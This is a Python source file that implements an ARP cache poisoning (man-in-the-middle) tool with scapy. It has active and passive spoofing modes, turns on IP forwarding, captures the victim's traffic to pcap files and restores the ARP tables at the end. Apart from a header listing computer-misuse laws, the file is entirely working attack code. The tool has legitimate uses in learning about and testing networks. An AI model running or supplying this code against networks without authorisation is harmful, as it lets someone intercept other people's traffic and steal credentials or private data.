"""
- 中国大陆: 刑法第285条 (非法侵入计算机信息系统罪) - 可导致刑事处罚
- 美国: 18 U.S. Code § 1030 (计算机欺诈和滥用法案) - 可导致重罪指控
- 英国: Computer Misuse Act 1990 (计算机滥用法案) - 可导致刑事起诉
- 禁止脚本小子
"""

from pathlib import Path
from ipaddress import ip_address
from multiprocessing import Process, Event
from scapy.sendrecv import sendp, srp, sniff
from scapy.layers.l2 import ARP, Ether
from scapy.utils import wrpcap
from scapy.config import conf
from datetime import datetime
import signal
import sys

RED_BOLD = "\033[1;31m"
BLUE_BOLD = "\033[1;34m"
RESET = "\033[0m"


def get_mac(target_ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    """
    A class to perform ARP spoofing (cache poisoning) attacks on a target device.

    This class facilitates both active and passive ARP spoofing strategies to intercept
    network traffic between a target device and the gateway. It supports automatic
    restoration of ARP tables upon attack completion or interruption.

    Attributes:
        target (str): IPv4 address of the target device.
        gateway (str): IPv4 address of the network gateway.
        interface (str): Network interface to use for the attack.
        count (int): Number of packets to capture during the attack (default: 200).
        delay (int): Delay in seconds between ARP spoofing packets (default: 2).
        ban (bool): Flag to prohibit automatic restoration of ARP tables post-attack (default: False). If True, no restoration occurs; if False, restoration is enabled.
        active (bool): Flag to select between active or passive attack mode.
        poison_event (multiprocessing.Event): Event to control poisoning process.
        sniff_process (multiprocessing.Process): Process handling packet capture.

    Methods:
        run(): Initiates the ARP spoofing attack with the configured parameters.
    """

    def __init__(
        self,
        target: str,
        gateway: str,
        interface: str,
        count: int = 200,
        path: Path = Path.cwd(), 
        delay=2,
        ban: bool = False,
        active=True,
        target_mac=None,
        gateway_mac=None,
    ):
        """
        :param target: Target IPv4 address
        :param gateway: Gateway IPv4 address
        :param interface: Selected network interface
        :param count: Number of packets to sniff, default is 200
        :param ban: Whether to prohibit automatic restoration of ARP table (default: False). If True, restoration is disabled; if False, restoration occurs.
        """
        # Raise an error immediately during initialisation for invalid input
        is_valid_ipv4((target, gateway))
        # Configured to spoof responses solely upon detecting ARP requests, but omitted the target and gateway MAC addresses
        if (not active) and not (target_mac and gateway_mac):
            raise InvalidConfigurationError(
                "PassiveAttacker selected, but target and gateway MAC addresses not provided"
            )
        self.ban = ban
        self.target = target
        self.gateway = gateway
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.count = count
        self.path = path
        self.interface = interface
        self.delay = delay
        self.active = active
        self.poison_event = None
        self.sniff_process: Process
        conf.iface = interface
        conf.verb = 0

        print(f"{BLUE_BOLD}Currently using interface {interface}: {RESET}")

    def run(self):
        self.target_mac = (
            get_mac(self.target) if self.target_mac is None else self.target_mac
        )
        self.gateway_mac = (
            get_mac(self.gateway) if self.gateway_mac is None else self.gateway_mac
        )
        if not (self.target_mac and self.gateway_mac):
            raise MACNotFoundError("Target or gateway unreachable")
        with IPForwarding():
            attacker = ActiveAttacker() if self.active else PassiveAttacker()
            # An Event instance is created if and only if the ActiveAttacker strategy is selected
            if isinstance(attacker, ActiveAttacker):
                self.poison_event = Event()
            attacker.start(self)
        return self.target_mac


def restore(arper: Arper):
    """
    Automatically restore the ARP table after the attack ends
    or the attack is cancelled
    """
    if not arper.ban:
        print("Restoring ARP tables...")
        sendp(
            Ether(src=arper.gateway_mac, dst=arper.target_mac)
            / ARP(
                op=2,
                psrc=arper.gateway,
                hwsrc=arper.gateway_mac,
                pdst=arper.target,
                hwdst=arper.target_mac,
            ),
            count=5,
        )
        sendp(
            Ether(src=arper.target_mac, dst=arper.gateway_mac)
            / ARP(
                op=2,
                psrc=arper.target,
                hwsrc=arper.target_mac,
                pdst=arper.gateway,
                hwdst=arper.gateway_mac,
            ),
            count=5,
        )


class ActiveAttacker:
    def poison(self, arper: Arper, event: Event):  # type: ignore
        # If you press CTRL-C, it terminates immediately
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        # Craft packets aimed at the target device
        ether1 = Ether(dst=arper.target_mac)
        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
        poison_target = ether1 / arp1

        print(f"IP src: {poison_target[ARP].psrc}")
        print(f"IP dst: {poison_target[ARP].pdst}")
        print(f"MAC src: {poison_target[Ether].src}")
        print(f"MAC dst: {poison_target[Ether].dst}")
        print(poison_target.summary())
        print("-" * 30)

        # Craft packets aimed at the gateway
        ether2 = Ether(dst=arper.gateway_mac)
        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
        poison_gateway = ether2 / arp2

        print(f"IP src: {poison_gateway[ARP].psrc}")
        print(f"IP dst: {poison_gateway[ARP].pdst}")
        print(f"MAC dst: {poison_gateway[Ether].dst}")
        print(f"MAC src: {poison_gateway[Ether].src}")
        print(poison_gateway.summary())
        print("-" * 30)
        print(f"Beginning the ARP poison. {RED_BOLD}[CTRL-C to stop]{RESET}")
        while not event.is_set():
            sys.stdout.write(".")
            sys.stdout.flush()
            sendp(poison_target)
            sendp(poison_gateway)
            event.wait(arper.delay)

    def sniff_and_store(self, arper: Arper):
        print(f"Sniffing {arper.count} packets")
        bpf_filter = f"host {arper.target} and not arp"
        signal.signal(signal.SIGINT, handle_sigint)
        packets = sniff(
            count=arper.count, filter=bpf_filter, iface=arper.interface
        )  # The sniff function can handle KeyboardInterrupt

        with NoInterrupt():
            arper.poison_event.set()  # type: ignore
            path = arper.path / f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap"
            file = path.open("wb")
            wrpcap(
                file,
                packets,
            )
            print(f"Got {len(packets)} packets")

    def start(self, arper: Arper):
        try:
            arper.sniff_process = Process(target=self.sniff_and_store, args=[arper])
            arper.sniff_process.start()
            while not arper.sniff_process.is_alive():
                pass
            poison_process = Process(
                target=self.poison, args=[arper, arper.poison_event]
            )
            poison_process.start()
            arper.sniff_process.join()
        except (KeyboardInterrupt, Exception) as e:
            with NoInterrupt():
                if isinstance(e, KeyboardInterrupt):
                    print("Aborted")
        else:
            with NoInterrupt():
                arper.poison_event.set()  # type: ignore
                poison_process.join()
        finally:
            with NoInterrupt():
                restore(arper)


class PassiveAttacker:
    def poison(self, arper: Arper):
        # Same as above
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        self.target = arper.target
        ether1 = Ether(dst=arper.target_mac)
        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
        self.poison_target = ether1 / arp1
        ether2 = Ether(dst=arper.gateway_mac)
        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
        self.poison_gateway = ether2 / arp2
        bpf_filter = (
            f"(src host {arper.target} or src host {arper.gateway}) "
            f"and arp and arp[6:2] = 1"
        )
        sniff(filter=bpf_filter, prn=self.spoof, store=0, iface=arper.interface)

    def spoof(self, packet):
        pkt = (
            self.poison_target
            if packet[ARP].psrc == self.target
            else self.poison_gateway
        )
        sendp(pkt, iface=self.iface)

    def sniff_and_store(self, arper: Arper, poison_process: Process):
        print(f"Sniffing {arper.count} packets")
        bpf_filter = f"host {arper.target} and not arp"
        signal.signal(signal.SIGINT, handle_sigint)
        # The sniff func automatically handles KeyboardInterrupt exceptions
        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
        # therefore the following code will be executed

        with NoInterrupt():
            poison_process.kill()
            poison_process.join()  # Hence, attempts to terminate it elsewhere in the code would be redundantt
            path = arper.path / f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap"
            file = path.open("wb")
            wrpcap(
                file,
                packets,
            )
            print(f"Got {BLUE_BOLD}{len(packets)}{RESET} packets")

    def start(self, arper: Arper):
        self.iface = arper.interface
        print(
            f"{RED_BOLD}Ensure that promiscuous mode is enabled for the interface at least. {RESET}"
        )
        try:
            poison_process = Process(target=self.poison, args=[arper])
            arper.sniff_process = Process(
                target=self.sniff_and_store, args=[arper, poison_process]
            )
            arper.sniff_process.start()
            while not arper.sniff_process.is_alive():
                pass
            poison_process.start()
            arper.sniff_process.join()
        except (Exception, KeyboardInterrupt) as e:  # Aborted
            with NoInterrupt():
                if isinstance(e, KeyboardInterrupt):
                    print("Aborted. ")
        finally:
            with NoInterrupt():
                restore(arper)


def handle_sigint(signum, frame):
    raise KeyboardInterrupt


def is_valid_ipv4(addrs):
    addr1, addr2 = addrs
    try:
        addr1, addr2 = ip_address(addr1), ip_address(addr2)
        if (addr1.version != 4) or (addr2.version != 4):
            raise InvalidIPAddressError("ARP cache poisoning requires IPv4")
    except ValueError:
        raise InvalidIPAddressError(f"Invalid IP format: {(addr1, addr2)}")


class NoInterrupt:
    """
    Prevent users from repeatedly triggering KeyboardInterrupt,
    ensuring crucial operations proceed smoothly
    """

    def __enter__(self):
        self.original = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        signal.signal(signal.SIGINT, self.original)


class IPForwarding:
    def __enter__(self):
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            self.original_value = f.read().strip()
        if self.original_value != "1":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.original_value != "1":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self.original_value + "\n")


class ARPSpoofingError(Exception):
    pass


class InvalidIPAddressError(ARPSpoofingError):
    pass


class MACNotFoundError(ARPSpoofingError):
    pass


class InvalidConfigurationError(ARPSpoofingError):
    pass
